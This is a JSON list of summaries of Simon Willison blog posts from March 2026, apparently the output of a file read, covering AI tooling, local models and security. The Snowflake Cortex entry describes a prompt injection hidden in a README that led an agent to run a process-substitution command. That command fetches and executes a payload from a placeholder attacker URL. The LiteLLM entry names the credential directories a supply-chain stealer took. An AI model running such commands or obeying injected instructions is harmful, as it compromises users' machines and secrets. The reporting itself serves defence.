      "content": "[\n  {\n    \"title\": \"Auto mode for Claude Code - New AI-based permission safeguards\",\n    \"description\": \"Claude Code introduced 'auto mode' as an alternative to --dangerously-skip-permissions, where Claude makes permission decisions on your behalf with safeguards. The safeguards use Claude Sonnet 4.6 as a classifier to review actions before they run, blocking actions that escalate beyond scope or target untrusted infrastructure. However, Simon remains unconvinced by prompt injection protections that rely on AI since they're non-deterministic by nature, and still prefers deterministic sandboxes.\",\n    \"author\": \"Simon Willison\",\n    \"source\": \"Blog\",\n    \"url\": \"https://simonwillison.net/2026/Mar/24/auto-mode-for-claude-code/\",\n    \"published_date\": \"2026-03-24\",\n    \"topics\": [\"AI\", \"security\", \"prompt-injection\", \"generative-ai\", \"llms\", \"coding-agents\", \"claude-code\"],\n    \"type\": \"technical\"\n  },\n  {\n    \"title\": \"Package Managers Need to Cool Down - Dependency cooldown mechanisms\",\n    \"description\": \"Following the LiteLLM supply chain attack, Simon revisits dependency cooldowns - only installing updated dependencies after they've been available for a few days. The article reviews current state of cooldown mechanisms across major packaging tools: pnpm 10.16, Yarn 4.10.0, Bun 1.3, Deno 2.6, uv 0.9.17, pip 26.0, and npm 11.10.0 all now support various forms of minimum release age gates to protect against supply chain attacks.\",\n    \"author\": \"Simon Willison\",\n    \"source\": \"Blog\",\n    \"url\": \"https://simonwillison.net/2026/Mar/24/package-managers-need-to-cool-down/\",\n    \"published_date\": \"2026-03-24\",\n    \"topics\": [\"security\", \"supply-chain\", \"javascript\", \"packaging\", \"pip\", \"pypi\", \"python\", \"npm\", \"deno\", \"uv\"],\n    \"type\": \"technical\"\n  },\n  {\n    \"title\": \"Malicious litellm_init.pth in litellm 1.82.8 - Credential stealer\",\n    \"description\": \"The LiteLLM v1.82.8 package on PyPI was compromised with a credential stealer hidden in base64 in a litellm_init.pth file, triggered just by installing the package (no import needed). It stole secrets from ~/.ssh/, ~/.gitconfig, ~/.aws/, ~/.kube/, ~/.config/, ~/.azure/, ~/.docker/, and many other locations. The attack started with a Trivy exploit that stole PyPI credentials. PyPI quarantined the package within hours.\",\n    \"author\": \"Simon Willison\",\n    \"source\": \"Blog\",\n    \"url\": \"https://simonwillison.net/2026/Mar/24/malicious-litellm-init-pth/\",\n    \"published_date\": \"2026-03-24\",\n    \"topics\": [\"security\", \"supply-chain\", \"open-source\", \"pypi\", \"python\"],\n    \"type\": \"technical\"\n  },\n  {\n    \"title\": \"Streaming experts: Running 1T parameter models on consumer hardware\",\n    \"description\": \"Dan Woods' experiments with streaming experts - running larger Mixture-of-Experts models on hardware without enough RAM by streaming expert weights from SSD for each token. @seikixtc reported running Kimi K2.5 (1 trillion parameters, 32B active weights) in 96GB RAM on M2 Max MacBook Pro. @anemll showed Qwen3.5-397B-A17B running on iPhone at 0.6 tokens/second. Daniel Isaac got Kimi K2.5 working on 128GB M4 Max at ~1.7 tokens/second.\",\n    \"author\": \"Simon Willison (covering Dan Woods, seikixtc, anemll, Daniel Isaac)\",\n    \"source\": \"Blog\",\n    \"url\": \"https://simonwillison.net/2026/Mar/24/streaming-experts/\",\n    \"published_date\": \"2026-03-24\",\n    \"topics\": [\"AI\", \"generative-ai\", \"local-llms\", \"llms\", \"qwen\", \"kimi\", \"autoresearch\"],\n    \"type\": \"research\"\n  },\n  {\n    \"title\": \"The real work of software development: LLMs can't choose\",\n    \"description\": \"Quote from David Abram: 'The hardest parts of the job were never about typing out code. I have always struggled most with understanding systems, debugging things that made no sense, designing architectures that wouldn't collapse under heavy load, and making decisions that would save months of pain later. None of these problems can be solved by LLMs... they don't choose. That part is still yours. The real work of software development, the part that makes someone valuable, is knowing what should exist in the first place, and why.'\",\n    \"author\": \"David Abram (quoted by Simon Willison)\",\n    \"source\": \"Blog\",\n    \"url\": \"https://simonwillison.net/2026/Mar/23/#3759845\",\n    \"published_date\": \"2026-03-23\",\n    \"topics\": [\"careers\", \"ai\", \"generative-ai\", \"llms\", \"ai-assisted-programming\"],\n    \"type\": \"opinion\"\n  },\n  {\n    \"title\": \"Experimenting with Starlette 1.0 with Claude skills\",\n    \"description\": \"Simon explores Starlette 1.0, a lightweight ASGI framework and foundation of FastAPI. The article covers building robust web applications with Starlette, including a demo task management app with routing, templating (Jinja2), async database operations (aiosqlite), and real-time updates. Simon uses Claude 'skills' - prompts packaged as reusable tools - to experiment with the framework.\",\n    \"author\": \"Simon Willison\",\n    \"source\": \"Blog\",\n    \"url\": \"https://simonwillison.net/2026/Mar/22/experimenting-with-starlette-10-with-claude-skills/\",\n    \"published_date\": \"2026-03-22\",\n    \"topics\": [\"open-source\", \"python\", \"ai\", \"asgi\", \"generative-ai\", \"llms\", \"ai-assisted-programming\", \"claude\", \"coding-agents\", \"skills\", \"agentic-engineering\", \"starlette\"],\n    \"type\": \"tutorial\"\n  },\n  {\n    \"title\": \"Profiling Hacker News users based on their comments\",\n    \"description\": \"Simon experiments with a 'mildly dystopian prompt': 'Profile this user' accompanied by a copy of their last 1,000 comments on Hacker News. The article explores using LLMs to analyze user behavior patterns, expertise areas, communication style, and interests from their comment history.\",\n    \"author\": \"Simon Willison\",\n    \"source\": \"Blog\",\n    \"url\": \"https://simonwillison.net/2026/Mar/21/profiling-hacker-news-users-based-on-their-comments/\",\n    \"published_date\": \"2026-03-21\",\n    \"topics\": [\"hacker-news\", \"ai\", \"generative-ai\", \"llms\", \"ai-ethics\"],\n    \"type\": \"research\"\n  },\n  {\n    \"title\": \"Using Git with coding agents - Agentic Engineering Patterns\",\n    \"description\": \"Git is essential for working with coding agents. This guide covers Git essentials (repositories, commits, branches, merging) and how coding agents can use Git's features fluently. Simon explains that we don't need to memorize Git commands but should understand what's possible to take full advantage of Git's capabilities when working with AI agents.\",\n    \"author\": \"Simon Willison\",\n    \"source\": \"Blog\",\n    \"url\": \"https://simonwillison.net/2026/Mar/21/using-git-with-coding-agents/\",\n    \"published_date\": \"2026-03-21\",\n    \"topics\": [\"coding-agents\", \"generative-ai\", \"github\", \"agentic-engineering\", \"ai\", \"git\", \"llms\"],\n    \"type\": \"technical\"\n  },\n  {\n    \"title\": \"Turbo Pascal 3.02A deconstructed - AI hallucination revealed\",\n    \"description\": \"Simon used Claude to decompile Borland's 1985 Turbo Pascal 3.02 (39,731 bytes) into an interactive artifact showing binary memory map and decompiled code. However, it was later revealed to be 'hallucinated slop' - a Hacker News reviewer found that many code snippets were fabricated and don't exist in the actual binary. Claude agreed with the assessment when the feedback was provided, highlighting the risk of AI-generated technical analysis.\",\n    \"author\": \"Simon Willison\",\n    \"source\": \"Blog\",\n    \"url\": \"https://simonwillison.net/2026/Mar/20/turbo-pascal-302a-deconstructed/\",\n    \"published_date\": \"2026-03-20\",\n    \"topics\": [\"computer-history\", \"tools\", \"ai\", \"generative-ai\", \"llms\", \"claude\"],\n    \"type\": \"research\"\n  },\n  {\n    \"title\": \"Cursor Composer 2 built on Kimi K2.5 model\",\n    \"description\": \"Kimi.ai confirmed that Cursor's newly launched Composer 2 was built on top of Kimi K2.5 model. Cursor accesses Kimi K2.5 via FireworksAI hosted RL and inference platform as part of an authorized commercial partnership. This represents continued pre-training and high-compute RL training on the open model.\",\n    \"author\": \"Kimi.ai (quoted by Simon Willison)\",\n    \"source\": \"Blog\",\n    \"url\": \"https://simonwillison.net/2026/Mar/20/#3760744\",\n    \"published_date\": \"2026-03-20\",\n    \"topics\": [\"ai\", \"generative-ai\", \"llms\", \"cursor\", \"ai-in-china\", \"kimi\"],\n    \"type\": \"technical\"\n  },\n  {\n    \"title\": \"Thoughts on OpenAI acquiring Astral and uv/ruff/ty\",\n    \"description\": \"Simon shares thoughts on OpenAI's acquisition of Astral, the company behind uv, ruff, and ty - three increasingly load-bearing open source projects in the Python ecosystem. The article discusses implications for the Python community, open source sustainability, and how these tools fit into AI-assisted development workflows.\",\n    \"author\": \"Simon Willison\",\n    \"source\": \"Blog\",\n    \"url\": \"https://simonwillison.net/2026/Mar/19/openai-acquiring-astral/\",\n    \"published_date\": \"2026-03-19\",\n    \"topics\": [\"python\", \"ai\", \"rust\", \"openai\", \"ruff\", \"uv\", \"astral\", \"coding-agents\"],\n    \"type\": \"opinion\"\n  },\n  {\n    \"title\": \"Autoresearching Apple's 'LLM in a Flash' to run Qwen 397B locally\",\n    \"description\": \"Dan Woods managed to get Qwen3.5-397B-A17B running at 5.5+ tokens/second on a 48GB MacBook Pro M3 Max, despite the model taking 209GB (120GB quantized) on disk. The technique uses Apple's 'LLM in a flash' paper - streaming expert weights from SSD for Mixture-of-Experts models. Dan fed the paper to Claude Code and used Andrej Karpathy's autoresearch pattern to run 90 experiments, producing MLX Objective-C and Metal code. Experts are quantized to 2-bit (later upgraded to 4-bit after finding 2-bit broke tool calling).\",\n    \"author\": \"Simon Willison (covering Dan Woods' research)\",\n    \"source\": \"Blog\",\n    \"url\": \"https://simonwillison.net/2026/Mar/18/autoresearching-apples-llm-in-a-flash/\",\n    \"published_date\": \"2026-03-18\",\n    \"topics\": [\"ai\", \"generative-ai\", \"local-llms\", \"llms\", \"qwen\", \"mlx\", \"autoresearch\"],\n    \"type\": \"research\"\n  },\n  {\n    \"title\": \"Snowflake Cortex AI escapes sandbox and executes malware\",\n    \"description\": \"PromptArmor report on a prompt injection attack in Snowflake's Cortex Agent (now fixed). The attack started when a user asked the agent to review a GitHub repository with prompt injection hidden in the README. The agent executed malicious code via process substitution: `cat < <(sh < <(wget -q0- https://ATTACKER_URL.com/bugbot))`. Cortex allowed `cat` commands without protecting against process substitution. Simon notes that allow-lists against command patterns feel unreliable and prefers deterministic sandboxes.\",\n    \"author\": \"Simon Willison\",\n    \"source\": \"Blog\",\n    \"url\": \"https://simonwillison.net/2026/Mar/18/snowflake-cortex-ai-escapes-sandbox/\",\n    \"published_date\": \"2026-03-18\",\n    \"topics\": [\"sandboxing\", \"security\", \"ai\", \"prompt-injection\", \"generative-ai\", \"llms\"],\n    \"type\": \"technical\"\n  }\n]\n",
      "numLines": 133,
      "startLine": 1,
      "totalLines": 133
    }
  }
}

